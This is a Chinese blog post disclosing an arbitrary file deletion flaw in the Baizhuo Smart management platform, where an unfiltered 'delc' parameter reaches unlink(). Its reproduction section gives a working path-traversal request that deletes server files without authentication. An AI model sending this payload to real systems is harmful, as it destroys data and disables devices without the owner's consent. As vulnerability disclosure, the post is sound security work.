---
title: "百卓Smart管理平台 useratte/layer_swich_conf.php 任意文件删除漏洞"
source: https://mrxn.net/jswz/baizhuosmart-useratte-layer_swich_conf-filedel.html
asset_dir: assets/百卓smart管理平台-userattelayer_swich_conf.php-任意文件删除漏洞
---

# 百卓Smart管理平台 useratte/layer\_swich\_conf.php 任意文件删除漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/20 20:26
- 971浏览
- [0评论](#comment)
- 4分钟阅读

深入探索

漏洞预警服务

软件

JSON处理工具

---

# 漏洞简介

百卓Smart管理平台是北京百卓网络技术有限公司(以下简称百卓网络)的一款安全网关产品，是一家致力于构建下一代安全互联网的高科技企业。  
百卓Smart管理平台 useratte/layer\_swich\_conf.php 接口存在任意文件删除漏洞。未经身份验证的攻击者可以利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")删除服务器上任意文件，造成系统崩溃不可运行。

漏洞扫描服务

# 漏洞分析

layer\_swich\_conf.php 主要业务逻辑代码如下

[![百卓Smart管理平台 useratte/layer_swich_conf.php 任意文件删除漏洞](images/img-001-eda0fca93166.webp)](https://image.mrxn.net/40a0c9a166dd49a3b2429ce4ac937c34.webp)

直接对传入的 `delc` 值拼接到 unlink函数后的文件路径上，无任何过滤，造成任意文件删除漏洞。

# 漏洞复现

深入探索

网络安全课程

SQL注入检测工具

编码转换工具

可通过其他漏洞如文件上传、sql注入写入文件后测试

[![百卓Smart管理平台 useratte/layer_swich_conf.php 任意文件删除漏洞](images/img-002-34658d8ff177.webp)](https://image.mrxn.net/a09387ed62cd4ccab828a2524ce15ffa.webp)

```
GET /useratte/layer_swich_conf.php?delc=../../home/1.php HTTP/1.1
Host: smart.mrxn.net
```

删除后，再次访问之前的文件，已经404了，成功删除了该文件

Windows安全工具

[![百卓Smart管理平台 useratte/layer_swich_conf.php 任意文件删除漏洞](images/img-003-478b729b6738.webp)](https://image.mrxn.net/b83c0c6a0ff648c6ad39acf7f1c08467.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.漏洞分析](#toc-2-)
- [3.漏洞复现](#toc-3-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
